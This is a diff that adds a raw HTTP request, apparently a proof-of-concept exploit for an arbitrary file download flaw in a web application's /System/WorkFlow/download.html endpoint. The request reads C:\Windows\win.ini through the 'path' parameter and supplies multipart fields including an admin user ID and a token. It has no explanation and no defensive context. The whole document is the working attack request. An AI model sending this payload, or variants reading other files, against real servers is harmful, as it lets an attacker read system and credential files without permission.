@@ -1,0 +1,20 @@
+POST /System/WorkFlow/download.html?path=C:\Windows\win.ini HTTP/1.1
+Accept-Encoding: gzip, deflate
+
+--vow8ojiofbpypwih3t3i
+Content-Disposition: form-data; name="userID"
+
+admin
+--vow8ojiofbpypwih3t3i
+Content-Disposition: form-data; name="fondsid"
+
+1
+--vow8ojiofbpypwih3t3i
+Content-Disposition: form-data; name="comid"
+
+1
+--vow8ojiofbpypwih3t3i
+Content-Disposition: form-data; name="token"
+
+5117e82385cef4c12547fdd4c028b97a1-1
+--vow8ojiofbpypwih3t3i--
